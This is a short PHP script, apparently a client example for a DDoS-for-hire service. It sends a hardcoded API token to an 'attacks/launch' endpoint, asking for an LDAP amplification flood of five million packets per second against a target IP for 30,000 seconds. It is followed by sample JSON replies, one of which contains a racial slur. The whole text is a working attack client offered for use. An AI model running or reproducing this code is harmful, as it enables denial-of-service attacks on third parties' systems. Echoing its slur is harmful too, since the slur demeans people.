<?php
$token = "525d5a88fb611915d9faa6e7656be7df";
$curl = curl_init();
curl_setopt_array($curl, array(
 CURLOPT_URL => "https://api.wifi.rip/v1/attacks/launch",
 CURLOPT_RETURNTRANSFER => 1,
 CURLOPT_POST => 1,
 CURLOPT_POSTFIELDS => array(
  token => $token,
  target => "IP Address",
  port => 80,
  duration => 30000,
  method => "LDAP",
  pps => 5000000
 )
));

$response = curl_exec($curl);
curl_close($curl);

echo $response;

{
"success": true,
"attack_id": 123,
"message": "You fucked that nigga up!"
}

{
"success": false,
"message": "You fucked something up..."
}